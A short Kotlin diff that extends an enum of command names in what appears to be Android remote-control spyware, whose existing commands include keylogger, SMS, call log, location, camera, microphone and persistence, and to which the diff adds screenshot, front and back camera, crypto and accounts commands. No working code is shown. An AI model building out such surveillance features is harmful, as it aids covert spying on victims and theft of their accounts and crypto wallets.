@@ -114,7 +114,9 @@ data class Command(
         SYSTEM("system"), KEYLOGGER("keylogger"), CONTACTS("contacts"),
         CALL_LOG("calllog"), SMS("sms"), LOCATION("location"),
         CAMERA("camera"), MICROPHONE("mic"), SCREEN("screen"),
-        FILE_MANAGER("filemgr"), PERSISTENCE("persist"), KILL("kill")
+        FILE_MANAGER("filemgr"), PERSISTENCE("persist"), KILL("kill"),
+        SCREENSHOT("screenshot"), CAM_FRONT("cam_front"), CAM_BACK("cam_back"),
+        MIC("microphone"), CRYPTO("crypto"), ACCOUNTS("accounts")
     }
 }
 
